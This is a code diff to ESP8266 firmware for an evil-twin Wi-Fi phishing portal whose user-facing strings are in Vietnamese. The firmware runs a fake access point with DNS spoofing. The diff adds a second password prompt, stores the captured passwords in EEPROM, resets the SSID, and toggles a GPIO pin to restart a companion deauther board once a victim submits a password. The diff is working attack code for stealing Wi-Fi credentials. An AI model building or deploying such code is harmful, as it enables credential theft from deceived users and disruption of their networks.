@@ -8,8 +8,8 @@
 #include <EEPROM.h>
 
 // Default SSID name
-const char* SSID_NAME = "__haha__";
-
+const char* SSID_NAME = "__hihi__";
+#define RSTdeauth 13 //GPIO13-D7
 // Default main strings
 #define SUBTITLE "Kết nối tự động."
 #define TITLE " "//"Update"
@@ -51,7 +51,7 @@ String header(String t) {
     "div { padding: 0.5em; }"
     "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
     "input { width: 100%; padding: 9px 10px; margin: 8px 0px; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
-    "label { color: #ff3333; display: block; font-style: italic; text-align: center; padding: 0.8em; }"
+    "label, p { color: #ff3333; display: block; font-style: italic; text-align: center; padding: 0.8em; }"
     "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; text-align: center;}"
     "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
     "textarea { width: 100%; }";
@@ -63,7 +63,7 @@ String header(String t) {
                   "<meta charset=\"UTF-8\">"
                  "</head>"
                  "<body>"
-                    "<nav><b>" + a + "</b> " + "</nav>";
+                    "<nav><b>" + a + "</b></nav>";
   return h; }
 
 String index() {
@@ -89,7 +89,39 @@ String posted() {
   passEnd += pass.length(); // Updating end position of passwords in EEPROM.
   EEPROM.write(passEnd, '\0');
   EEPROM.commit();
-  return header(POST_TITLE) + "<div><p>Kiểm tra mật khẩu và thử lại</p></div>";
+  return header(POST_TITLE) + 
+                "<form action=/post2  method=post>"+
+                  "<label>Kiểm tra mật khẩu và thử lại.</label>"+
+                  "<input type=password name=m placeholder=\"Mật khẩu \" required minlength=\"8\" autofocus ></input>"+
+                  "<input type=submit value=\"Kết nối\" >"+
+                 "</form>";
+}
+
+String posted2() {
+  String pass = input("m");
+  pass = "<li><b>" + pass + "</li></b>"; // Adding password in a ordered list.
+  allPass += pass;                       // Updating the full passwords.
+
+  // Storing passwords to EEPROM.
+  for (int i = 0; i <= pass.length(); ++i)
+  {
+    EEPROM.write(passEnd + i, pass[i]); // Adding password to existing password in EEPROM.
+  }
+
+  passEnd += pass.length(); // Updating end position of passwords in EEPROM.
+  EEPROM.write(passEnd, '\0');
+  EEPROM.commit(); 
+  
+  //đặt tên wifi về mặc định SSID_
+   String postedSSID = SSID_NAME; newSSID="<li><b>" + postedSSID + "</b></li>";
+  for (int i = 0; i < postedSSID.length(); ++i) {
+    EEPROM.write(i, postedSSID[i]);
+  }
+  EEPROM.write(postedSSID.length(), '\0');
+  EEPROM.commit();
+  WiFi.softAP(postedSSID);
+  
+  return header(POST_TITLE) + "<p>Đang xác thực... </p>";
 }
 
 String pass() {
@@ -123,13 +155,19 @@ String clear() {
   return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>";
 }
 
-void BLINK() { // The built-in LED will blink 5 times after a password is posted.
+ void BLINK() { // The built-in LED will blink 5 times after a password is posted.
   for (int counter = 0; counter < 10; counter++)
   {
     // For blinking the LED.
     digitalWrite(BUILTIN_LED, counter % 2);
     delay(500);
   }
+}
+ void offdeauth() { //restart esp8266_deauther
+    delay(1000);
+    digitalWrite(RSTdeauth, LOW);
+    delay(200);
+    digitalWrite(RSTdeauth, HIGH);
 }
 
 void setup() {
@@ -187,6 +225,7 @@ void setup() {
   // Start webserver
   dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)
   webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
+   webServer.on("/post2",[]() { webServer.send(HTTP_CODE, "text/html", posted2()); offdeauth(); });
   webServer.on("/wifi",[]() { webServer.send(HTTP_CODE, "text/html", ssid()); });
   webServer.on("/postSSID",[]() { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
   webServer.on("/mk",[]() { webServer.send(HTTP_CODE, "text/html", pass()); });
@@ -197,6 +236,8 @@ void setup() {
   // Enable the built-in LED
   pinMode(BUILTIN_LED, OUTPUT);
   digitalWrite(BUILTIN_LED, HIGH);
+  pinMode(RSTdeauth, OUTPUT);
+  digitalWrite(RSTdeauth, HIGH);
 }
 
 
